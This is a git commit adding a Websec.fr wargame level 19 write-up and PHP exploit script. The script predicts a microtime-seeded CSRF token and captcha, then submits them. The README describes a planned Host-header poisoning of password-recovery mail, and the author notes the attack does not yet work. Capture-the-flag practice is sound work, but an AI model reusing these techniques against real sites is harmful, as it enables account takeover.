34664e58714dad0efdee744462380bb213773078
Matti Nelersa <mati.nelersa@gmail.com>
2025-09-20 01:20:23 +0300

    level19

---
+++ Websec.fr/level19/README.md
@@ -0,0 +1,6 @@
+This level I can guess the seed because microtime puts out a float but srand takes an int so I can bruteforce it.
+I then can guess the csrf_token and captcha and pass the captcha to get a recover mail.
+Also the recover mail is sent based on the ```$_SERVER['HTTP_HOST']``` and that can be manipulated via the Host header in a http req.
+
+P.S
+The script works, but when I change the Host header I get a 404. this is really weird, I will come back to this to get my flag!
---
+++ Websec.fr/level19/script.php
@@ -0,0 +1,52 @@
+<?php 
+    echo "Starting script\n";
+
+    srand (microtime (true));
+
+    function generate_random_text ($length) {
+        $chars  = "abcdefghijklmnopqrstuvwxyz";
+        $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+        $chars .= "1234567890";
+
+        $text = '';
+        for($i = 0; $i < $length; $i++) {
+            $text .= $chars[rand () % strlen ($chars)];
+        }
+        return $text;
+    }
+    $my_token = generate_random_text(32);
+    echo "My token = " . $my_token . "\n";
+
+    $resp = file_get_contents("https://websec.fr/level19/index.php");
+
+    $php_sessid = null;
+    foreach ($http_response_header as $hdr) {
+        if (preg_match('/^Set-Cookie:\s*PHPSESSID=([^;]+)/', $hdr, $matches)) {
+            $php_sessid = $matches[1];
+            break;
+        }
+    }
+    echo "sessid: " . $php_sessid , "\n";
+
+    $server_token = preg_match('/name="token" value="([A-Z)a-z0-9]+)"/', $resp, $matches);
+
+    if ($my_token === $matches[1]) {
+        echo "Found seed!\n";
+    }
+    else {
+        die("Seed is wrong");
+    }
+
+    $captcha = generate_random_text (255 / 10.0);
+
+    echo "Captcha is: " . $captcha . "\n";
+
+    $ch = curl_init('https://websec.fr/level19/index.php');
+    curl_setopt($ch, CURLOPT_POST, TRUE);
+    curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=$php_sessid");
+    curl_setopt($ch, CURLOPT_POSTFIELDS, "captcha=$captcha&token=$my_token");
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Host: websec.fr"));
+
+    curl_exec($ch);
+    curl_close($ch);
+?>
